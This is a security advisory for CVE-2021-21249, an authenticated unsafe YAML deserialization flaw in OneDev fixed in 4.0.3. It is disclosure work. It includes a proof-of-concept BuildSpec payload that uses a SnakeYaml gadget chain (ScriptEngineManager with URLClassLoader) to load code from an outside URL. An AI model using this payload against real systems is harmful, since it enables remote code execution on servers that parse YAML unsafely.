# Post-Auth Unsafe Yaml deserialization

High

[robinshine](/robinshine)
published
GHSA-7xhq-m2q9-6hpm
Jan 11, 2021

## Package

No package listed

## Affected versions

<4.0.2

## Patched versions

4.0.3

## Description

### Impact

In order to parse and process YAML files, OneDev uses SnakeYaml which by default (when not using `SafeConstructor`) allows the instantiation of arbitrary classes. We can leverage that to run arbitrary code by instantiating classes such as `javax.script.ScriptEngineManager` and using `URLClassLoader` to load the script engine provider, resulting in the instantiation of a user controlled class. We can observe that by providing the following BuildSpec:

```
version: 1
jobs:
- name: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://qgayzevwou8by0k3ochje4ebx23srh.burpcollaborator.net"]]]]
  image: asdasd
  commands:
  - asd
  retrieveSource: true
  cloneCredential: !DefaultCredential {}
  cpuRequirement: 250m
  memoryRequirement: 128m
  retryCondition: never
  maxRetries: 3
  retryDelay: 30
  timeout: 3600

```

By intercepting the resolution of the provided URL, we can prove that the payload succeeded.

This issue may lead to `post-auth RCE`

### Patches

This issue was addressed in 4.0.3 by only allowing certain known classes to be deserialized

### Credits

This issue was discovered by [@pwntester](https://github.com/pwntester)

### Severity

High

### CVE ID

CVE-2021-21249

### Weaknesses

No CWEs
